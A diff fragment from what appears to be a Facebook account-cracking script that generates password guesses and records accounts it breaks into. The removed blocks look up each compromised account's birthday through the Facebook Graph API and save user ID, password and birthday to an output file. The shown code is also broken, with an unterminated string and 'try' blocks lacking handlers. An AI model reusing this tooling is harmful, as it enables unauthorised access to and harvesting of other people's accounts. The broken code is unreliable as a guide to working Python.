@@ -350,17 +350,7 @@ def act():
                 cps.close()
 
                 cpb.append(c + user + pass1)
-                try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+")
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
-						cp.append(uid+' ◊ '+pw+'◊'+ttl)
-						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
-						save.close()
-
+              
             else:
 
                 pass2 = k + c + user
@@ -390,16 +380,7 @@ def act():
                     cps.write(k + c + user + pass3 + '\n')
 
                     cps.close() 
-                    try:
-						token = open('login.txt').read()
-						url = ("https://graph.facebook.com/"+uid+")
-						data = s.get(url).json()
-						ttl = data['birthday'].replace("/","-")
-						print('\r\033[0;33m [×] ' +uid+ ' ◊ ' + pw + ' ◊ ' + ttl)
-						cp.append(uid+' ◊ '+pw+'◊'+ttl)
-						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
-						save.write(' [×] '+str(uid)+' ◊ '+str(pw)+' ◊ '+str(ttl)+'\n')
-						save.close()
+               
 
                     cpb.append(c + user + pass3)
 
